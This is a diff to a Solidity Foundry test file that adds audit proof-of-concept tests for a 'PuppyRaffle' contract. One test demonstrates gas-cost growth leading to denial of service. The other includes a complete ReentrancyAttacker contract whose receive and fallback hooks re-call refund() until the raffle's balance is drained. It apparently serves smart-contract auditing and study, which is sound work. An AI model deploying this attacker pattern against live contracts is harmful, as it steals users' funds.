@@ -4,7 +4,6 @@ pragma experimental ABIEncoderV2;
 
 import {Test, console} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
-
 contract PuppyRaffleTest is Test {
     PuppyRaffle puppyRaffle;
     uint256 entranceFee = 1e18;
@@ -212,5 +211,118 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+
+    // @audit PoC DoS attack
+    function test_dnialOfService() public {
+        // Let´s enter 100 players
+        uint256 playersNumber = 100;
+        address[] memory players = new address[](playersNumber);
+        for (uint256 i = 0; i < playersNumber; i++) {
+            players[i] = address(i);
+        }
+        
+        // Set a non-zero gas price for this test
+        uint256 customGasPrice = 1 gwei;
+        vm.txGasPrice(customGasPrice);
+        
+        // see how much gas it takes to enter 100 players
+        uint256 gasStart = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(players);
+        uint256 gasEnd = gasleft();
+        uint256 gasUsed = gasStart - gasEnd;
+        uint256 gasCost = gasUsed * tx.gasprice;
+        
+        console.log("Gas cost for 100 players:", gasCost / 1e9);
+
+        // Now for the second 100 players
+        address[] memory playersTwo = new address[](playersNumber);
+        for (uint256 i = 0; i < playersNumber; i++) {
+            playersTwo[i] = address(i + playersNumber);
+        }
+        
+        // see how much gas it takes to enter 100 players
+        uint256 gasStartTwo = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(playersTwo);
+        uint256 gasEndTwo = gasleft();
+        uint256 gasUsedTwo = gasStartTwo - gasEndTwo;
+        uint256 gasCostTwo = gasUsedTwo * tx.gasprice;
+        
+        console.log("Gas used for sencond 100 players:", gasCostTwo / 1e9);
+    }
+
+    // @audit Refund reentrancy attack
+    function test_reentracyRefund() public {
+        ReentrancyAttacker reentrancyAttackerContract;
+        reentrancyAttackerContract = new ReentrancyAttacker(puppyRaffle);
+        vm.deal(address(reentrancyAttackerContract), 1 ether);
+
+        // Let´s enter 100 players
+        uint256 playersNumber = 100;
+        address[] memory players = new address[](playersNumber);
+        for (uint256 i = 0; i < playersNumber; i++) {
+            players[i] = address(i);
+        }
+        
+        // Enter 100 players to the raffle
+        puppyRaffle.enterRaffle{value: entranceFee * playersNumber}(players);
+
+        // Check balance before the attack
+        console.log("PuppyRaffle balance before attack:", address(puppyRaffle).balance / 1e18);
+        console.log("ReentrancyAttacker balance before attack:", address(reentrancyAttackerContract).balance / 1e18);
+        console.log("-------------------");
+
+        // Reentrancy attack contract starts the attack
+        reentrancyAttackerContract.attack();
+
+        // Check balance after attack
+        console.log("PuppyRaffle balance after attack:", address(puppyRaffle).balance / 1e18);
+        console.log("ReentrancyAttacker balance after attack:", address(reentrancyAttackerContract).balance / 1e18);
+        console.log("-------------------");
+
+        // Check the reentrancy attack count
+        console.log("Reentrancy attack count:", reentrancyAttackerContract.attackCount());
+
+        assertEq(address(puppyRaffle).balance, 0);
+        assertEq(address(reentrancyAttackerContract).balance, 101 ether);
+        assertEq(reentrancyAttackerContract.attackCount(), 101);
+    }
+}
+
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffleContract;
+    uint256 public entraceFee;
+    uint256 public playerIndex;
+    
+    uint256 public attackCount;
+
+    constructor(PuppyRaffle _puppyRaffleContract) {
+        puppyRaffleContract = _puppyRaffleContract;
+        entraceFee = puppyRaffleContract.entranceFee();
+    }
+
+    function attack() public {
+        // Enter the raffle
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffleContract.enterRaffle{value: entraceFee}(players);
+        // Refund the entrance fee & start attack
+        playerIndex = puppyRaffleContract.getActivePlayerIndex(address(this));
+        puppyRaffleContract.refund(playerIndex);
+    }
+
+    function _stealMoney() internal {
+        attackCount++;
+        if (address(puppyRaffleContract).balance >= entraceFee) {
+            puppyRaffleContract.refund(playerIndex);
+        }
+    }
+
+    receive() external payable {
+        _stealMoney();
+    }
+
+    fallback() external payable {
+        _stealMoney();
     }
 }
